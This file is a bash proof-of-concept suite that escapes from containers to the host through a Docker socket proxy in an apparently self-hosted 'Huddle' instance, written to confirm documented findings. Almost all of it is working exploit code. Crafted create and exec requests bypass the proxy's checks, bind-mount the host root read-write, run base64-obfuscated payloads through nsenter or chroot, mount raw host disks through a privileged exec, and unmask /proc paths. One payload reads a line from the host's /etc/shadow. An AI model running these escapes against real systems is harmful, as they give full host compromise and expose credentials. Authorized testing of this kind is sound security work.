#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Huddle host-escape PoC suite — one PoC per validated finding.
# AUTHORIZED SECURITY TESTING ONLY. Run inside a devcontainer of YOUR OWN Huddle
# instance to confirm the findings in docs/security/dind-findings-vs-main.md.
#
# All payloads are harmless: pop a calculator on the host and/or drop a proof
# file. No persistence, no exfiltration, no destruction. Each PoC self-cleans and
# exits 2 if the proxy refuses it (finding closed on that instance).
#
#   usage:  poc-suite.sh <name>
#   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (host PID ns)
#           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
#           1c   #1 minimal: `binds` only                 → host-fs read+write
#           7    #7 privileged exec-create                → host raw-disk (best-effort)
#           mask MaskedPaths unmask (NON-destructive probe, no sysrq)
#           list show this table
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

NAME="${1:-list}"
IMAGE="${POC_IMAGE:-alpine:3.20}"
# alpine busybox lacks nsenter; we install util-linux inside the container.
# Use debian/ubuntu if you want it pre-installed: POC_IMAGE=ubuntu:24.04
API="http://d"
STAMP="poc-$$"

# ── socket ────────────────────────────────────────────────────────────────────
SOCK=""
[[ "${DOCKER_HOST:-}" == unix://* ]] && SOCK="${DOCKER_HOST#unix://}"
for c in "$SOCK" /var/run/huddle/docker.sock /var/run/dind/docker.sock /var/run/docker.sock; do
  [[ -n "$c" && -S "$c" ]] && { SOCK="$c"; break; }
done
[[ -S "${SOCK:-}" ]] || { echo "no docker proxy socket (set DOCKER_HOST)"; exit 1; }
CURL=(curl -s --unix-socket "$SOCK")

CLEAN_IDS=()
cleanup() { for id in "${CLEAN_IDS[@]:-}"; do [[ -n "$id" ]] && "${CURL[@]}" -X DELETE "$API/containers/$id?force=true" >/dev/null 2>&1 || true; done; }
trap cleanup EXIT

pull() { echo "[*] pull $IMAGE"; "${CURL[@]}" -X POST "$API/images/create?fromImage=${IMAGE%%:*}&tag=${IMAGE##*:}" >/dev/null || true; }

# create_raw <name> <json-body>  → prints CID (empty on refusal)
create_raw() {
  "${CURL[@]}" -X POST -H 'Content-Type: application/json' -d "$2" \
    "$API/containers/create?name=$1" | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p'
}
run_and_log() { # <cid>
  "${CURL[@]}" -X POST "$API/containers/$1/start" >/dev/null
  "${CURL[@]}" -X POST "$API/containers/$1/wait" >/dev/null || true
  "${CURL[@]}" "$API/containers/$1/logs?stdout=true&stderr=true" | tr -d '\r' | sed 's/^/      /'
}
refused() { echo "[-] refused — finding closed on this instance (patched?)."; exit 2; }
b64() { printf '%s' "$1" | base64 | tr -d '\n'; }
cmd_json() { printf '["/bin/sh","-c","echo %s | base64 -d | /bin/sh"]' "$(b64 "$1")"; }

# payload that runs on the HOST via nsenter/chroot (needs host PID ns + bind /) ─
CALC_ON_HOST='set -x
# alpine busybox has no nsenter; install it
if ! command -v nsenter >/dev/null 2>&1; then
  apk add --no-cache util-linux >/dev/null 2>&1 || echo "[!] apk add util-linux failed"
fi

P=/tmp/huddle-escape-'"$STAMP"'.txt

# ── 1) write proof via nsenter (host namespaces) ──────────────
echo "[*] nsenter into host PID 1 ..."
nsenter -t 1 -m -u -i -n -p -- sh -c "
  echo \"PoC '"$STAMP"' host-exec\" > \"$P\"
  id >> \"$P\"
  uname -a >> \"$P\"
  hostname >> \"$P\"
  echo \"[+] proof written to host:$P\"
"
if [ $? -ne 0 ]; then
  echo "[!] nsenter failed — falling back to chroot /host"
  chroot /host sh -c "
    echo \"PoC '"$STAMP"' host-exec (chroot)\" > \"$P\"
    id >> \"$P\"
    uname -a >> \"$P\"
    hostname >> \"$P\"
    echo \"[+] proof written to host:$P\"
  "
fi

# ── 2) pop calc ──────────────────────────────────────────────
# Detect WSL2 vs native Linux
if [ -f /host/mnt/c/Windows/System32/cmd.exe ] || grep -qi microsoft /host/proc/version 2>/dev/null; then
  echo "[*] WSL2 detected — launching calc via Windows interop"
  # Method A: nsenter + cmd.exe (interop available in host namespace)
  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
    && echo "[+] calc launched (nsenter+cmd.exe)" && exit 0
  # Method B: chroot into host rootfs where binfmt_misc resolves PE binaries
  chroot /host /mnt/c/Windows/System32/cmd.exe /c start calc 2>/dev/null \
    && echo "[+] calc launched (chroot+cmd.exe)" && exit 0
  # Method C: powershell
  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
    && echo "[+] calc launched (powershell)" && exit 0
  chroot /host /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command "Start-Process calc" 2>/dev/null \
    && echo "[+] calc launched (chroot+powershell)" && exit 0
  # Method D: write a bat and schedule it
  echo "calc" > /host/mnt/c/Users/Public/huddle-poc.bat
  nsenter -t 1 -m -u -i -n -p -- /mnt/c/Windows/System32/cmd.exe /c "C:\\Users\\Public\\huddle-poc.bat" 2>/dev/null \
    && echo "[+] calc launched (bat)" && exit 0
  echo "[!] all WSL2 calc methods failed — check proof file instead: $P"
else
  echo "[*] native Linux — launching calc via nsenter"
  for calc in gnome-calculator kcalc xcalc xterm; do
    DISPLAY="${DISPLAY:-:0}" nsenter -t 1 -m -u -i -n -p -- "$calc" >/dev/null 2>&1 \
      && echo "[+] launched $calc" && exit 0
  done
  echo "[!] no GUI calculator found — check proof file: $P"
fi'

case "$NAME" in
# ── Finding #1a: top-level lowercase hostconfig key ──────────────────────────
1a)
  pull
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$CALC_ON_HOST"),\"hostconfig\":{\"privileged\":true,\"pidmode\":\"host\",\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (proxy saw body.HostConfig=undefined)"; run_and_log "$CID"
  ;;
# ── Finding #1b: proper HostConfig, but lowercase INNER keys ──────────────────
1b)
  pull
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$CALC_ON_HOST"),\"HostConfig\":{\"privileged\":true,\"pidmode\":\"host\",\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (guard checked HostConfig.Privileged=undefined)"; run_and_log "$CID"
  ;;
# ── Finding #1c: minimal — `binds` only, no privileged/pidmode ───────────────
# No host PID ns → can't pop GUI, but host root fs is mounted rw = full compromise.
1c)
  pull
  HOSTFS='set +e
P=/tmp/huddle-escape-'"$STAMP"'.txt
echo "PoC '"$STAMP"' host-fs write via binds-only bypass" > "/host$P"
echo "host hostname: $(cat /host/etc/hostname 2>/dev/null)"
echo "host /etc/shadow line 1: $(head -1 /host/etc/shadow 2>/dev/null)"
echo "wrote proof (host) $P"'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$HOSTFS"),\"hostconfig\":{\"binds\":[\"/:/host\"]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
  ;;
# ── Finding #7: privileged exec-create ───────────────────────────────────────
# Create a NORMAL (allowed) container, then exec into it with Privileged:true.
# The exec gets all caps + device-cgroup allow-all → raw host block device.
# Environment-dependent (needs host block devices; WSL/virtiofs may lack them).
7)
  pull
  CID=$(create_raw "huddle-$STAMP" "{\"Image\":\"$IMAGE\",\"Cmd\":[\"sleep\",\"120\"],\"HostConfig\":{}}")
  [[ -z "$CID" ]] && { echo "[-] plain create refused (unexpected)"; exit 2; }
  CLEAN_IDS+=("$CID"); "${CURL[@]}" -X POST "$API/containers/$CID/start" >/dev/null
  echo "[+] owned container $CID started (non-privileged)"
  DISK='set +e
for d in /dev/sda /dev/vda /dev/nvme0n1 /dev/xvda; do
  [ -b "$d" ] || mknod "$d" b $(cat /sys/class/block/$(basename $d)/dev 2>/dev/null | tr ":" " ") 2>/dev/null
done
mkdir -p /m
for d in /dev/sda1 /dev/sda2 /dev/vda1 /dev/nvme0n1p1; do
  mount -o ro "$d" /m 2>/dev/null && { echo "MOUNTED host disk $d:"; head -1 /m/etc/hostname 2>/dev/null; umount /m; break; }
done
echo "priv-exec caps: $(grep CapEff /proc/self/status)"'
  EXECID=$("${CURL[@]}" -X POST -H 'Content-Type: application/json' \
    -d "{\"Privileged\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Cmd\":$(cmd_json "$DISK")}" \
    "$API/containers/$CID/exec" | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p')
  [[ -z "$EXECID" ]] && refused
  echo "[+] privileged exec accepted: $EXECID (proxy never inspected the exec body)"
  "${CURL[@]}" -X POST -H 'Content-Type: application/json' -d '{"Detach":false,"Tty":false}' \
    "$API/exec/$EXECID/start" | tr -d '\r' | sed 's/^/      /'
  ;;
# ── MaskedPaths unmask — NON-destructive probe only ───────────────────────────
mask)
  pull
  PROBE='set +e
echo "kcore masked? $(ls -l /proc/kcore 2>&1 | grep -q " 0 " && echo yes || echo NO-unmasked)"
echo "sysrq-trigger present+writable? $([ -w /proc/sysrq-trigger ] && echo YES || echo no)"
echo "(refusing to write /proc/sysrq-trigger — that would be a destructive host action)"'
  CID=$(create_raw "huddle-$STAMP" \
    "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$PROBE"),\"HostConfig\":{\"MaskedPaths\":[],\"ReadonlyPaths\":[]}}")
  [[ -z "$CID" ]] && refused
  CLEAN_IDS+=("$CID"); echo "[+] created $CID with empty MaskedPaths/ReadonlyPaths"; run_and_log "$CID"
  ;;
list|*)
  sed -n '11,17p' "$0"
  ;;
esac
